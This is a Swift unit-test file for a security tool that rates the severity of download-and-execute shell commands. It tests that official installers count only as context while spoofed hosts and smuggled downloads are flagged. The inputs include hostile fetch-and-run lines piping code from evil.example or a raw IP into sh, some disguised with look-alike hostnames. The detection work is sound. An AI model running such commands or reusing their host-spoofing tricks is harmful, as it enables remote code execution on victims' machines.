import XCTest
@testable import GhostProcessSniperCore

/// Well-known installer one-liners are context, not findings, but only for
/// the address actually downloaded, and only on the installer's own host.
final class InstallerAllowlistTests: XCTestCase {
    private func severity(_ command: String) -> SentinelSeverity? {
        CommandPatterns.signals(commandLine: command, program: "sh").first { $0.kind == .downloadAndExecute }?.severity
    }

    func testOfficialInstallersStayContext() {
        XCTAssertEqual(severity("curl --proto =https --tlsv1.2 -sSf https://sh.rustup.rs | sh"), .info)
        XCTAssertEqual(severity(#"/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""#), .info)
        XCTAssertEqual(severity("curl -fsSL https://ollama.com/install.sh | sh"), .info)
    }

    func testLookAlikeHostsAreNotTheInstaller() {
        XCTAssertEqual(severity("curl -fsSL https://sh.rustup.rs.evil.example/x | sh"), .notable)
        XCTAssertEqual(severity("curl -fsSL https://sh.rustup.rs@evil.example/x | sh"), .notable)
        XCTAssertEqual(severity("curl -fsSL http://sh.rustup.rs/x | sh"), .suspicious, "not over https")
    }

    func testAnAllowlistedAddressElsewhereDoesNotVouchForTheDownload() {
        XCTAssertEqual(severity("sh -c curl https://sh.rustup.rs -o /dev/null; curl http://45.9.148.21/x | sh"), .suspicious)
        XCTAssertEqual(severity(#"bash -c "$(curl -fsSL https://evil.example/i.sh)" # https://sh.rustup.rs"#), .notable)
    }
}
